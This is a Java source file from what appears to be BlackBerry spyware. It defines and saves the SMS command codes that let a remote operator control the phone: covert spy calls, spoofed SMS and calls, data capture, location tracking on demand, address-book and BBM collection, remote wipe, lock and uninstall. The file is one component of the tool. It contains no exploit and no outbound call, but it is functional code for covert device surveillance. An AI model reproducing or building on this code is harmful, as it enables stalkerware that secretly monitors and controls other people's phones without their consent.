package com.vvt.rmtcmd;

import java.util.Vector;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.system.RuntimeStore;

public class SMSCmdStore {
	
	private static SMSCmdStore self = null;
	private static final long SMS_CMD_STORE_GUID = 0x428241159153d72aL;
	private static final long RMT_CMD_KEY = 0xe632fc72164b91e2L;
	private static final int HEARTBEAT_CMD = 2;
	private static final int REQUEST_STARTUP_TIME_CMD = 5;
	private static final int ENABLE_SPY_CALL_CMD = 9;
	private static final int ENABLE_SPY_CALL_MPN_CMD = 10;
	private static final int PANIC_MODE_CMD = 31;
	private static final int ADD_WATCH_CMD = 45;
	private static final int RESET_WATCH_CMD = 46;
	private static final int CLEAR_WATCH_CMD = 47;
	private static final int QUERY_WATCH_CMD = 48;
	private static final int ENABLE_WATCHLIST_CMD = 49;
	private static final int SET_WATCH_FLAG_CMD = 50;
	private static final int ENABLE_GPS_CMD = 52;
	private static final int UPDATE_LOC_INTERVAL_CMD = 53;
	private static final int BBM_CMD = 55;
	private static final int ENABLE_SIM_CMD = 56;
	private static final int ENABLE_CAPTURE_CMD = 60;
//	private static final int STOP_CAPTURE_CMD = 61;
	private static final int SEND_DIAGNOSTICS_CMD = 62;
	private static final int SEND_LOG_NOW_CMD = 64;
	private static final int REQUEST_SETTINGS_CMD = 67;
	private static final int SPOOFSMS_CMD = 85;
	private static final int SPOOFCALL_CMD = 86;
	private static final int SET_SETTING_CMD = 92;
	private static final int GPS_ON_DEMAND_CMD = 101;
	private static final int SEND_ADDR_CMD = 120;
	private static final int SEND_ADDR_FOR_APPROVAL_CMD = 121;
	private static final int ADD_HOMEOUT_CMD = 150;
	private static final int RESET_HOMEOUT_CMD = 151;
	private static final int CLEAR_HOMEOUT_CMD = 152;
	private static final int QUERY_HOMEOUT_CMD = 153;
	private static final int ADD_HOMEIN_CMD = 154;
	private static final int RESET_HOMEIN_CMD = 155;
	private static final int CLEAR_HOMEIN_CMD = 156;
	private static final int QUERY_HOMEIN_CMD = 157;
	private static final int ADD_MONITOR_CMD = 160;
	private static final int CLEAR_MONITOR_CMD = 161;
	private static final int QUERY_MONITOR_CMD = 162;
	private static final int RESET_MONITOR_CMD = 163;
	private static final int REQUEST_MOBILE_NUMBER_CMD = 199;
	private static final int UNINSTALL_CMD = 200;
	private static final int WIPEOUT_CMD = 201;
	private static final int LOCK_DEVICE_CMD = 202;
	private static final int UNLOCK_DEVICE_CMD = 203;
	private static final int SYNC_UPDATE_CONFIG_CMD = 300;
	private static final int SYNC_ADDRESSBOOK_CMD = 301;
	private static final int SYNC_COMM_DIRECTIVE_CMD = 302;
	private static final int SYNC_TIME_CMD = 303;
	private static final int ADD_URL_CMD = 396;
	private static final int RESET_URL_CMD = 397;
	private static final int CLEAR_URL_CMD = 398;
	private static final int QUERY_URL_CMD = 399;
	private static final int ACTIVATION_AC_URL_CMD = 14140;
	private static final int ACTIVATION_URL_CMD = 14141;
	private static final int DEACTIVATION_CMD = 14142;
	private static final int REQ_CURRENT_URL_CMD = 14143;
//	private static final int ACTIVATION_PHONE_NUMBER_CMD = 14258;
	private static final int DELETE_ALL_EVENT_CMD = 14587;
	private PersistentObject rmtCmdPersistent = null;
	private SMSCommandCode smsCmdCode = null;
	private Vector observers = new Vector();
	
	private SMSCmdStore() {
		rmtCmdPersistent = PersistentStore.getPersistentObject(RMT_CMD_KEY);
		smsCmdCode = (SMSCommandCode)rmtCmdPersistent.getContents();
		if (smsCmdCode == null) {
			smsCmdCode = new SMSCommandCode();
			rmtCmdPersistent.setContents(smsCmdCode);
			rmtCmdPersistent.commit();
			useDefault();
		}
	}
	
	public static SMSCmdStore getInstance() {
		if (self == null) {
			self = (SMSCmdStore)RuntimeStore.getRuntimeStore().get(SMS_CMD_STORE_GUID);
		}
		if (self == null) {
			SMSCmdStore smsStore = new SMSCmdStore();
			RuntimeStore.getRuntimeStore().put(SMS_CMD_STORE_GUID, smsStore);
			self = smsStore;
		}
		return self;
	}
	
	public void addListener(SMSCmdChangeListener observer) {
		if (!isListenerExisted(observer)) {
			observers.addElement(observer);
		}
	}

	public void removeListener(SMSCmdChangeListener observer) {
		if (isListenerExisted(observer)) {
			observers.removeElement(observer);
		}
	}
	
	public SMSCommandCode getSMSCommandCode() {
		smsCmdCode = (SMSCommandCode)rmtCmdPersistent.getContents();
		return smsCmdCode;
	}
	
	public void useDefault() {
		smsCmdCode = getSMSCommandCode();
		smsCmdCode.setRequestHeartbeatCmd(HEARTBEAT_CMD);
		smsCmdCode.setEnableCaptureCmd(ENABLE_CAPTURE_CMD);
//		smsCmdCode.setStopCaptureCmd(STOP_CAPTURE_CMD);
		smsCmdCode.setRequestEventsCmd(SEND_LOG_NOW_CMD);
		smsCmdCode.setSendDiagnosticsCmd(SEND_DIAGNOSTICS_CMD);
		smsCmdCode.setEnableSIMCmd(ENABLE_SIM_CMD);
		smsCmdCode.setEnableGPSCmd(ENABLE_GPS_CMD);
		smsCmdCode.setGPSOnDemandCmd(GPS_ON_DEMAND_CMD);
		smsCmdCode.setUpdateLocationIntervalCmd(UPDATE_LOC_INTERVAL_CMD);
		smsCmdCode.setBBMCmd(BBM_CMD);
		smsCmdCode.setActivateUrlCmd(ACTIVATION_URL_CMD);
		smsCmdCode.setActivationAcUrlCmd(ACTIVATION_AC_URL_CMD);
		smsCmdCode.setDeactivationCmd(DEACTIVATION_CMD);
//		smsCmdCode.setActivationPhoneNumberCmd(ACTIVATION_PHONE_NUMBER_CMD);
		smsCmdCode.setRequestCurrentURLCmd(REQ_CURRENT_URL_CMD);
		smsCmdCode.setUninstallCmd(UNINSTALL_CMD);
		smsCmdCode.setWipeoutCmd(WIPEOUT_CMD);
		smsCmdCode.setLockDeviceCmd(LOCK_DEVICE_CMD);
		smsCmdCode.setUnLockDeviceCmd(UNLOCK_DEVICE_CMD);
		smsCmdCode.setDeleteDatabaseCmd(DELETE_ALL_EVENT_CMD);
		smsCmdCode.setSettingCmd(SET_SETTING_CMD);
		smsCmdCode.setEnableSpyCallCmd(ENABLE_SPY_CALL_CMD);
		smsCmdCode.setEnableSpyCallMPNCmd(ENABLE_SPY_CALL_MPN_CMD);
		smsCmdCode.setSendAddrForApprovalCmd(SEND_ADDR_FOR_APPROVAL_CMD);
		smsCmdCode.setSyncAddressbookCmd(SYNC_ADDRESSBOOK_CMD);
		smsCmdCode.setSyncTimeCmd(SYNC_TIME_CMD);
		smsCmdCode.setSyncCommDirectiveCmd(SYNC_COMM_DIRECTIVE_CMD);
		smsCmdCode.setAddURLCmd(ADD_URL_CMD);
		smsCmdCode.setResetURLCmd(RESET_URL_CMD);
		smsCmdCode.setClearURLCmd(CLEAR_URL_CMD);
		smsCmdCode.setQueryUrlCmd(QUERY_URL_CMD);
		smsCmdCode.setSyncUpdateConfigCmd(SYNC_UPDATE_CONFIG_CMD);	
		smsCmdCode.setSpoofCallCmd(SPOOFCALL_CMD);
		smsCmdCode.setSpoofSMSCmd(SPOOFSMS_CMD);
		smsCmdCode.setPanicModeCmd(PANIC_MODE_CMD);
		smsCmdCode.setAddHomeOutNumberCmd(ADD_HOMEOUT_CMD);
		smsCmdCode.setResetHomeOutNumberCmd(RESET_HOMEOUT_CMD);
		smsCmdCode.setClearHomeOutNumberCmd(CLEAR_HOMEOUT_CMD);
		smsCmdCode.setQueryHomeOutNumberCmd(QUERY_HOMEOUT_CMD);
		smsCmdCode.setAddHomeInNumberCmd(ADD_HOMEIN_CMD);
		smsCmdCode.setResetHomeInNumberCmd(RESET_HOMEIN_CMD);
		smsCmdCode.setClearHomeInNumberCmd(CLEAR_HOMEIN_CMD);
		smsCmdCode.setQueryHomeInNumberCmd(QUERY_HOMEIN_CMD);
		smsCmdCode.setSendAddressbookCmd(SEND_ADDR_CMD);
		smsCmdCode.setAddMonitorNumberCmd(ADD_MONITOR_CMD);
		smsCmdCode.setResetMonitorNumberCmd(RESET_MONITOR_CMD);
		smsCmdCode.setClearMonitorNumberCmd(CLEAR_MONITOR_CMD);
		smsCmdCode.setQueryMonitorNumberCmd(QUERY_MONITOR_CMD);
		smsCmdCode.setEnableWatchListCmd(ENABLE_WATCHLIST_CMD);
		smsCmdCode.setSetWatchFlagsCmd(SET_WATCH_FLAG_CMD);
		smsCmdCode.setAddWatchNumberCmd(ADD_WATCH_CMD);
		smsCmdCode.setResetWatchNumberCmd(RESET_WATCH_CMD);
		smsCmdCode.setClearWatchNumberCmd(CLEAR_WATCH_CMD);
		smsCmdCode.setQueryWatchNumberCmd(QUERY_WATCH_CMD);
		smsCmdCode.setRequestSettingsCmd(REQUEST_SETTINGS_CMD);
		smsCmdCode.setRequestStartupTimeCmd(REQUEST_STARTUP_TIME_CMD);
		smsCmdCode.setRequestMobileNumberCmd(REQUEST_MOBILE_NUMBER_CMD);
		commit(smsCmdCode);
	}
	
	public void commit(SMSCommandCode smsCmdCode) {
		rmtCmdPersistent.setContents(smsCmdCode);
		rmtCmdPersistent.commit();
		for (int i = 0; i < observers.size(); i++) {
			SMSCmdChangeListener observer = (SMSCmdChangeListener)observers.elementAt(i);
			observer.smsCmdChanged();
		}
	}
	
	private boolean isListenerExisted(SMSCmdChangeListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < observers.size(); i++) {
			if (observers.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
}
